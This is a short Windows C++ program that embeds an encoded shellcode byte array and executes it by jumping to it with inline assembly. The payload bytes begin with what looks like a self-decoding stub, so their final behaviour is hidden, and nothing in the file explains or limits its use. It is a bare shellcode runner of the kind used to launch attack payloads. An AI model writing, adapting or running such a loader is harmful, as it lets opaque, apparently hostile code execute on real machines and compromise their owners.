#include "stdafx.h"
#include "windows.h"

char shellcode[] = 
"\xdd\xc5\xbe\x58\x21\xcb\x0f\xd9\x74\x24\xf4\x5f\x31\xc9" 
"\xb1\x31\x83\xef\xfc\x31\x77\x16\x03\x77\x16\xe2\xad\xdd" 
"\x23\x86\x4d\x1e\xb4\xf9\xc4\xfb\x85\x2b\xb2\x88\xb4\xfb" 
"\xb1\xdd\x34\x77\x97\xf5\xcf\xf5\x3f\xf9\x78\xb3\x19\x34" 
"\x78\x75\xa5\x9a\xba\x17\x59\xe1\xee\xf7\x60\x2a\xe3\xf6" 
"\xa5\x57\x0c\xaa\x7e\x13\xbf\x5b\x0b\x61\x7c\x5d\xdb\xed" 
"\x3c\x25\x5e\x31\xc8\x9f\x61\x62\x61\xab\x29\x9a\x09\xf3" 
"\x89\x9b\xde\xe7\xf5\xd2\x6b\xd3\x8e\xe4\xbd\x2d\x6f\xd7" 
"\x81\xe2\x4e\xd7\x0f\xfa\x97\xd0\xef\x89\xe3\x22\x8d\x89" 
"\x30\x58\x49\x1f\xa4\xfa\x1a\x87\x0c\xfa\xcf\x5e\xc7\xf0" 
"\xa4\x15\x8f\x14\x3a\xf9\xa4\x21\xb7\xfc\x6a\xa0\x83\xda" 
"\xae\xe8\x50\x42\xf7\x54\x36\x7b\xe7\x31\xe7\xd9\x6c\xd3" 
"\xfc\x58\x2f\xbe\x03\xe8\x4a\x87\x04\xf2\x54\xa8\x6c\xc3" 
"\xdf\x27\xea\xdc\x0a\x0c\x04\x97\x16\x25\x8d\x7e\xc3\x77" 
"\xd0\x80\x3e\xbb\xed\x02\xca\x44\x0a\x1a\xbf\x41\x56\x9c" 
"\x2c\x38\xc7\x49\x52\xef\xe8\x5b\x31\x62\x73\x64";


int _tmain(int argc, _TCHAR* argv[])
{
	int* shell = (int*)shellcode;
	__asm{
		jmp shell;
	}
}

